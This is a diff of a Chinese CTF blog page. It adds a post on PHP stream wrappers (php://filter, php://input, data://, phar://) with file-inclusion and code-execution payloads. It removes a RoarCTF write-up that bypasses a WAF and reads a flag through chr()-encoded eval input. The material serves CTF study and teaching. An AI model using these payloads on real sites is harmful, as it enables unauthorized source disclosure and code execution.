@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 11.67px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,97 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-伪协议" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+        伪协议
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="我们在ctf中可能遇到的包含函数"><a href="#我们在ctf中可能遇到的包含函数" class="headerlink" title="我们在ctf中可能遇到的包含函数"></a>我们在ctf中可能遇到的包含函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include( )</span><br><span class="line">require( )</span><br><span class="line">include_once( )</span><br><span class="line">require_once( )</span><br><span class="line">highlight_file( )</span><br><span class="line">show_source( )</span><br><span class="line">readfile( )</span><br><span class="line">file_get_contents( )</span><br><span class="line">fopen( )</span><br><span class="line">file( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>PHP伪协议其实就是支持的协议和封装协议，有12种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// ——访问本地文件</span><br><span class="line">http://——访问HTTP(s)网址</span><br><span class="line">ftp://——访问FTP(s)URLs</span><br><span class="line">php://——访问各个输入或输出流（I/O streams）</span><br><span class="line">zlib://——压缩流</span><br><span class="line">data://——数据(RFC2397)</span><br><span class="line">glob://——查找匹配的文件路径模式</span><br><span class="line">phar://——PHP归档</span><br><span class="line">ssh2://——Secure Shell2</span><br><span class="line">rar://——RAR</span><br><span class="line">ogg://——音频流</span><br><span class="line">expect://——处理交互的流</span><br></pre></td></tr></table></figure>
+
+<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>file://用于读取本地文件，不受allow_url_fopen和allow_url_include影响</p>
+<h3 id="file-文件的绝对路径和文件名"><a href="#file-文件的绝对路径和文件名" class="headerlink" title="file://[文件的绝对路径和文件名]"></a>file://[文件的绝对路径和文件名]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=file://D:/soft/xiaocheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="文件的相对路径和文件名"><a href="#文件的相对路径和文件名" class="headerlink" title="[文件的相对路径和文件名]"></a>[文件的相对路径和文件名]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=./xioacheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="http-网络路径和文件名"><a href="#http-网络路径和文件名" class="headerlink" title="http://网络路径和文件名"></a>http://网络路径和文件名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xioacheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-用于访问各个输入-输出流（I-O-streams-，不受allow-url-fopen影响"><a href="#php-用于访问各个输入-输出流（I-O-streams-，不受allow-url-fopen影响" class="headerlink" title="php://用于访问各个输入/输出流（I/O streams)，不受allow_url_fopen影响"></a>php://用于访问各个输入/输出流（I/O streams)，不受allow_url_fopen影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter 用于读取源码</span><br><span class="line">php://input 用于执行php代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用上面两种格式的php伪协议格式时，需要allow_url_include是on</p>
+<h3 id="常用php-filter读取文件源码的格式（针对php文件需要base64编码）："><a href="#常用php-filter读取文件源码的格式（针对php文件需要base64编码）：" class="headerlink" title="常用php://filter读取文件源码的格式（针对php文件需要base64编码）："></a>常用php://filter读取文件源码的格式（针对php文件需要base64编码）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=[文件名]（如果文件内容非php语法，则输出源码内容，如果是php语法，则执行php代码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="常用php-input执行php代码的格式（输入的php代码部分需要post提交）"><a href="#常用php-input执行php代码的格式（输入的php代码部分需要post提交）" class="headerlink" title="常用php://input执行php代码的格式（输入的php代码部分需要post提交）"></a>常用php://input执行php代码的格式（输入的php代码部分需要post提交）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input[POST DATA]&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="zip-协议-amp-bzaip2-协议-amp-zlib-协议"><a href="#zip-协议-amp-bzaip2-协议-amp-zlib-协议" class="headerlink" title="zip://协议&amp;bzaip2://协议&amp;zlib://协议"></a>zip://协议&amp;bzaip2://协议&amp;zlib://协议</h2><h3 id="zip-协议-amp-bzaip2-协议-amp-zlib-协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀"><a href="#zip-协议-amp-bzaip2-协议-amp-zlib-协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀" class="headerlink" title="zip://协议&amp;bzaip2://协议&amp;zlib://协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀"></a>zip://协议&amp;bzaip2://协议&amp;zlib://协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀</h3><h4 id="zip-压缩文件的绝对路径-23-压缩文件内的子文件名-编码-23）"><a href="#zip-压缩文件的绝对路径-23-压缩文件内的子文件名-编码-23）" class="headerlink" title="zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名](#编码%23）"></a>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名](#编码%23）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://D:\www\xiaocheng.zip%23cheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="compress-bzip2-file-bz2压缩xiaocheng-txt为xiaocheng-bz2并上传（同样支持任意后缀名）"><a href="#compress-bzip2-file-bz2压缩xiaocheng-txt为xiaocheng-bz2并上传（同样支持任意后缀名）" class="headerlink" title="compress.bzip2://file.bz2压缩xiaocheng.txt为xiaocheng.bz2并上传（同样支持任意后缀名）"></a>compress.bzip2://file.bz2压缩xiaocheng.txt为xiaocheng.bz2并上传（同样支持任意后缀名）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://D:\www\xioacheng.bz2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="compress-zlib-file-gz压缩xiaocheng-txt为xiaocheng-gz并上传（同样支持任意后缀名）"><a href="#compress-zlib-file-gz压缩xiaocheng-txt为xiaocheng-gz并上传（同样支持任意后缀名）" class="headerlink" title="compress.zlib://file.gz压缩xiaocheng.txt为xiaocheng.gz并上传（同样支持任意后缀名）"></a>compress.zlib://file.gz压缩xiaocheng.txt为xiaocheng.gz并上传（同样支持任意后缀名）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://D:\www\xiaocheng.gz</span><br></pre></td></tr></table></figure>
+
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://协议可以执行php代码，但是需要allow_url_include和allow_url_fopen是on的，也可以写入文本数据</p>
+<p>data://协议常用的格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>其它格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data://,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">data://text/plain,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">data://text/html,&lt;html代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/css,&lt;CSS代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/javascript,&lt;js代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/gif;base24,&lt;base24编码的gif图片数据&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><p>phar://协议可以访问zip格式压缩包内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=phar://D:\www\xiaocheng.zip\xioacheng.txt</span><br></pre></td></tr></table></figure>
+
+<p>详细请看：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a><br>    <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2fce6931dd06">https://www.jianshu.com/p/2fce6931dd06</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-安洵杯2019serilaze" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -836,81 +927,6 @@ echo serialize($a);
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 <p>由代码中，我们可以再次使用数组绕过，构造param1[]=1&amp;param2[]=2，且用post提交</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-[RoarCTF 2019]Easy Calc(waf绕过和字符串特性及preg_match绕过）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/">
-        Easy Calc(waf绕过和字符串特性及preg_match绕过）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php字符串特性及waf绕过"><a href="#php字符串特性及waf绕过" class="headerlink" title="php字符串特性及waf绕过"></a>php字符串特性及waf绕过</h1><h2 id="php字符串特性"><a href="#php字符串特性" class="headerlink" title="php字符串特性"></a>php字符串特性</h2><p>php在查询字符串时，会有两个特性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除空白格</span><br><span class="line"></span><br><span class="line">将某些字符转换为下划线</span><br></pre></td></tr></table></figure>
-
-<h2 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h2><p>如果一个waf对一个变量的内容进行了审计，则如果想绕过waf，可以在变量名前面加空格，这样waf就不会将其作为<br>它要审计的变量名，但前提是waf不是php写的，题目是php写的</p>
-<h2 id="scandir-函数"><a href="#scandir-函数" class="headerlink" title="scandir()函数"></a>scandir()函数</h2><p>scandir()函数返回指定目录的文件和目录的数组</p>
-<h2 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h2><p>var_dump()函数显示一个或多个表达式的结构信息，包括表达式的类型和数值</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过查看页面源代码，我们可以知道它有一个waf和一个文件calc.php</p>
-<p>我们通过构造/calc.php，得到源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>通过对源代码的审计，发现它对某些字符进行了过滤</p>
-<p>因此，由于可以利用php字符串的特性，在num前面加空格绕过waf，并构造payload来查看flag位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
-
-<p>可以看见里面有flagg文件，因此我们可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
-
-<p>可以得到flag</p>
 
       
     </div>
